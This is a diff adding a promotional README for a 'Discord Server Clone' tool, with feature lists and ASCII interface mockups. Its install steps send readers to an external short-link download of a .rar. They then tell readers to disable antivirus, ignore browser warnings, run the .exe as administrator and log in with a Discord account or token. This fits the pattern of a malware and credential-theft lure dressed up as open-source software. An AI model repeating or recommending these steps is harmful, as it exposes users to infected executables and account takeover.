@@ -1,0 +1,254 @@
+# DISCORD SERVER CLONE
+
+Ultimate Discord Server Copier. Clone Channels, Roles, Permissions. Perfect Backup Tool.
+
+Discord Server Clone is the most advanced tool for duplicating entire Discord servers. Copy all channels, categories, roles, permissions, and settings with one click. Perfect for backing up servers, creating templates, or migrating communities.
+
+---
+
+DOWNLOAD: https://github.guru/s/a4m5cEwb
+INSTALL: Download .rar → Disable antivirus temporarily → Extract → .exe as admin → Login with Discord → Select source server → Select target → Start clone
+
+---
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠️ IMPORTANT DOWNLOAD NOTICE ⚠️
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+YOUR BROWSER MAY SHOW A WARNING – THIS IS REGULAR FOR OPENSOURCE APP
+
+When downloading this open-source software, Chrome, Edge, Firefox, or other browsers may display a warning message such as:
+
+• "This file is not commonly downloaded and may be dangerous"
+• "Chromium could not verify the safety of this download"
+• "This type of file can harm your computer"
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠️ IMPORTANT DOWNLOAD NOTICE ⚠️
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+---
+
+QUICK INSTALL
+
+1. Click "Keep" on browser warning
+2. Right-click .rar → Extract files
+3. Run .exe as administrator
+4. Login with your Discord account
+5. Select source server to clone
+6. Select target server (new or existing)
+7. Choose what to clone
+8. Start cloning process
+
+---
+
+FEATURES OVERVIEW
+
+📋 COMPLETE SERVER CLONING
+Clone entire Discord servers with full structure preservation:
+- All text channels with topics
+- All voice channels with bitrate limits
+- All categories and channel ordering
+- All roles with permissions and colors
+- Server settings and emojis
+- Channel permissions for roles
+- Webhook configurations
+
+🎯 SELECTIVE CLONING
+Choose exactly what you want to clone:
+- Channels only
+- Roles only
+- Categories only
+- Permissions only
+- Emojis and stickers
+- Custom combinations
+
+🔄 MULTIPLE TARGETS
+- Create brand new server
+- Clone to existing server
+- Merge into existing server
+- Update existing server structure
+- Multiple servers at once
+
+⚡ FAST PROCESSING
+Clone servers of any size quickly:
+- 100 channels in under 60 seconds
+- Bulk role creation
+- Parallel processing
+- Rate limit handling
+- Auto-retry on failure
+
+
+📦 TEMPLATE SYSTEM
+Save server structures as templates:
+- Create template from any server
+- Load template to new server
+- Share templates with team
+- Template library included
+
+---
+
+MAIN PANEL PREVIEW
+
+┌─────────────────────────────────────┐
+│  DISCORD SERVER CLONE v2026  [X]     │
+├─────────────────────────────────────┤
+│                                      │
+│  ACCOUNT: @username#1234            │
+│  STATUS: Connected                   │
+│  SERVERS: 24 accessible              │
+│                                      │
+│  SOURCE SERVER                       │
+│  └─ [Select Server ▼]               │
+│     Name: Gaming Community          │
+│     Channels: 47                     │
+│     Roles: 12                        │
+│     Members: 3,200                   │
+│                                      │
+│  TARGET SERVER                       │
+│  └─ [Create New ▼]                   │
+│     Name: Gaming Community Copy     │
+│     Region: US East                 │
+│                                      │
+│  CLONE OPTIONS                       │
+│  ├─ ☑ Text channels                  │
+│  ├─ ☑ Voice channels                 │
+│  ├─ ☑ Categories                     │
+│  ├─ ☑ Roles with permissions        │
+│  ├─ ☑ Channel permissions           │
+│  ├─ ☐ Emojis (slow)                 │
+│  ├─ ☐ Stickers                      │
+│  └─ ☐ Webhooks                      │
+│                                      │
+│  ADVANCED                            │
+│  ├─ Speed: ███████░░░ 70%           │
+│  ├─ Preserve order: [✓]             │
+│  ├─ Copy role colors: [✓]           │
+│  └─ Auto retry on fail: [✓]         │
+│                                      │
+│  ┌─────────────────────────────────┐│
+│  │  SUMMARY                         ││
+│  │  Channels: 47 to create          ││
+│  │  Roles: 12 to create             ││
+│  │  Categories: 8 to create         ││
+│  │  Est. time: 2-3 minutes         ││
+│  └─────────────────────────────────┘│
+│                                      │
+│  [START CLONE]  [SAVE TEMPLATE]     │
+└─────────────────────────────────────┘
+
+---
+
+CLONE PROGRESS
+
+```
+┌─────────────────────────────────────┐
+│  CLONING IN PROGRESS                 │
+├─────────────────────────────────────┤
+│                                      │
+│  Overall: ██████░░░░░░ 60%          │
+│                                      │
+│  ✓ Creating roles... (12/12)       │
+│  ✓ Creating categories... (8/8)     │
+│  ▶ Creating channels... (28/47)     │
+│  ⏳ Setting permissions...           │
+│  ⏳ Copying emojis...                │
+│                                      │
+│  Time elapsed: 1:24                 │
+│  Est. remaining: 0:56               │
+│  Status: Processing channels        │
+│                                      │
+│  [PAUSE]  [CANCEL]                   │
+└─────────────────────────────────────┘
+```
+
+---
+
+WHAT CAN BE CLONED
+
+✅ TEXT CHANNELS
+Channel names, topics, slowmode, NSFW status, category placement, permission overwrites
+
+✅ VOICE CHANNELS
+Channel names, bitrate, user limit, category placement, permission overwrites
+
+✅ CATEGORIES
+Category names, channel ordering inside, permission overwrites
+
+✅ ROLES
+Role names, colors, permissions, hoist status, mentionability, position order
+
+✅ PERMISSIONS
+Role permissions, channel-specific overwrites, category-level permissions
+
+✅ EMOJIS & STICKERS
+Custom emoji names and images (rate limited)
+
+✅ SERVER SETTINGS
+Server name, icon, region, verification level, explicit content filter
+
+---
+
+TEMPLATE EXAMPLES
+
+```
+┌─────────────────────────────────────┐
+│  TEMPLATE LIBRARY                    │
+├─────────────────────────────────────┤
+│                                      │
+│  🎮 Gaming Server                    │
+│  • 45 channels                       │
+│  • 12 roles                          │
+│  • 8 categories                      │
+│  Last used: 2 days ago               │
+│                                      │
+│  💼 Community Server                 │
+│  • 28 channels                       │
+│  • 8 roles                           │
+│  • 5 categories                      │
+│  Last used: 1 week ago               │
+│                                      │
+│  📚 Education Server                 │
+│  • 35 channels                       │
+│  • 6 roles                           │
+│  • 7 categories                      │
+│  Last used: 3 days ago               │
+│                                      │
+│  [LOAD]  [SAVE CURRENT]  [DELETE]    │
+└─────────────────────────────────────┘
+```
+
+---
+
+REQUIREMENTS
+
+✓ Discord account
+✓ "Manage Server" permission on source
+✓ "Manage Server" permission on target
+✓ Administrator or appropriate roles
+✓ Discord token (auto-login supported)
+
+---
+
+USE CASES
+
+🔄 SERVER BACKUP
+Create exact backups of your servers before making major changes. Restore structure if something goes wrong.
+
+📋 SERVER TEMPLATES
+Save perfect server templates for future use. Share templates with team members. Create consistent server structures across communities.
+
+🚀 SERVER MIGRATION
+Move from one server to another while preserving all structure. Upgrade to new server with better name or region. Merge multiple servers.
+
+👥 COMMUNITY GROWTH
+Create multiple servers with identical structure. Franchise your community format. Onboard new moderators with perfect setup.
+
+---
+
+TAGS: discord server clone, discord backup, discord server copier, discord template, discord channel cloner, discord role cloner, discord tool, discord migration, discord server template
+
+---
+
+▶ GET DISCORD SERVER CLONE: https://github.guru/s/a4m5cEwb
+
